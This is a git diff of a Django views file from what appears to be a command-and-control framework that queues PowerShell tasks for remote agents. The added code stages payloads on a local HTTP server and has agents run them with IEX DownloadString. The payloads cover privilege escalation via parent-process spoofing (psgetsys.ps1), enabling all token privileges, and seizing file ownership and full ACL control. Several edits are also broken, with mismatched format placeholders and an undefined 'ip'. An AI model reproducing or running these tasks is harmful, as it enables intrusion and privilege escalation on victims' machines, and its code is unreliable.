@@ -8,7 +8,7 @@ import netifaces
 # from rest_framework.views import APIView
 
 current_path= os.path.dirname(os.path.abspath(__file__))
-tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/Tools&Scripts"
+tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/ToolsScripts"
 
 #we need to send request from GUI user with agent(hidden parm) and path(opt)
 def DirectoryListing(request):
@@ -75,7 +75,7 @@ def DownloadFileAsync(request):
         agentTask.save()
         url = request.POST['url']
         outpath = request.POST['outpath']
-        task = "(New-Object Net.WebClient).DownloadFileAsync('{}', '{}')".format(url, outpath)
+        task = "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';(New-Object Net.WebClient).DownloadFileAsync('{}', '{}')".format(url, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -93,7 +93,7 @@ def DownloadString(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         url = request.POST['url']
-        task = "IEX (New-Object Net.WebClient).DownloadString('{url}')".format(url)
+        task = "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';IEX (New-Object Net.WebClient).DownloadString('{url}')".format(url)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -132,7 +132,7 @@ def Download_FTP(request):
         ip = request.POST['ip']
         filename = request.POST['filename']
         outpath = request.POST['outpath']
-        task = "(New-Object Net.WebClient).DownloadFile('ftp://{ip}/{filename}', '{outpath}')".format(ip,filename, outpath)
+        task = "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';(New-Object Net.WebClient).DownloadFile('ftp://{ip}/{filename}', '{outpath}')".format(ip,filename, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -389,7 +389,7 @@ def processes(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Running_processes===============";tasklist ;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Running_processes==============="; ;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -406,9 +406,12 @@ def ScreenShot(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        f = open("{}".format(current_path+"screenshot"), "rt")
-        task = f.read()
-        f.close()
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        os.system("timeout 20 python3 -m http.server 8888 --directory {} &".format(tools_path))
+        # f = open("{}".format(current_path+"/screenshot"), "rt")
+        #(New-Object Net.WebClient).DownloadFileAsync("http://{}:8888/screenshot.ps1", $env:userprofile'\screenshot.ps1');import-module
+        task = 'IEX(New-Object Net.WebClient).DownloadString("http://{}:8888/screenshot.ps1")'.format(ip)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -605,7 +608,6 @@ def procdump (request):
         return render(request, 'blog/listeners.html')
 
 
-
 def tasklist (request):
     if request.method=='POST':
         agent = request.POST['agent']
@@ -613,7 +615,6 @@ def tasklist (request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-        
         task = 'echo "++++++++++++++++++`r`n`t`r`n===============Task_List===============";tasklist;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -633,14 +634,15 @@ def Exec_With_Prnt_Priv(request):
         agentTask.save() 
         system_pid = request.POST['system_pid']    
         path_to_execute = request.POST['path_to_execute']
-        listenerdata = ListenerForm.objects.filter("-created_date").values()[0]
-        ip = listenerdata['ip']
-        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        os.system("timeout 30 python -m http.server 8888 --directory {} & ".format(tools_path))
         task = "IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/psgetsys.ps1');[MyProcess]::CreateProcessFromParent({},'{}','')".format(ip,system_pid,path_to_execute)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
             f.close()
+        
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
@@ -664,8 +666,6 @@ def Import_Module (request):
         return JsonResponse({},status=200)
     else:
         return render(request, 'blog/listeners.html')
-
-
 
 
 def Exec_Module (request):
@@ -714,9 +714,9 @@ def Take_Own (request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
-
+        username = request.POST['username']
         FilePath = request.POST['FilePath']
-        task = "takeown /f '{}'".format(FilePath)
+        task = "IEX(New-Object Net.WebClient).DownloadString('http://{0}:8888/Enable-Privilege.ps1');IEX(New-Object Net.WebClient).DownloadString('http://{0}:8888/EnableAllTokenPrivs.ps1');takeown /f '{1}';icacls '{1}' /grant {2}:F".format(ip,FilePath,username)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -737,7 +737,7 @@ def ACL_modify (request):
 
         FilePath = request.POST['FilePath']
         UserName = request.POST['UserName']
-        task = "icacls '{}' /grant {}:F".format(FilePath,UserName)
+        task = "icacls '{0}' /grant {1}:F".format(FilePath,UserName)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -748,7 +748,6 @@ def ACL_modify (request):
 
 
 def SeBackUpPrivelege (request):
-
     if request.method=='POST':
         agent = request.POST['agent']
         agentId = request.POST['agentId']
@@ -772,3 +771,22 @@ def SeBackUpPrivelege (request):
 
 
 #dll, ps1, exe
+
+
+def enable_all_privilleges(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN==============="; IEX(New-Object Net.WebClient).DownloadString("http://{}:8888/Enable-Privilege.ps1");IEX(New-Object Net.WebClient).DownloadString("http://{}:8888/EnableAllTokenPrivs.ps1");whoami /priv;echo "++++++++++++++++++`r`n"'.format(ip)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
